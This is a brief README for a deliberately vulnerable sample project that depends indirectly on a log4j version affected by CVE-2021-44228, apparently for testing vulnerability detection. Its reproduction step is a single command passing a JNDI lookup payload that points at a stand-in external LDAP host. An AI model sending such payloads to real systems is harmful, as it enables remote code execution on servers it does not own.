# sample-vulnerable-log4j-indirect-app

This repository is a sample repository that is vulnerable to [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) because it indirectly depends on a vulnerable version of log4j.

## Repro of vulnerability

``` shell
gradle run --args='${jndi:ldap://some.host.example.com/}'
```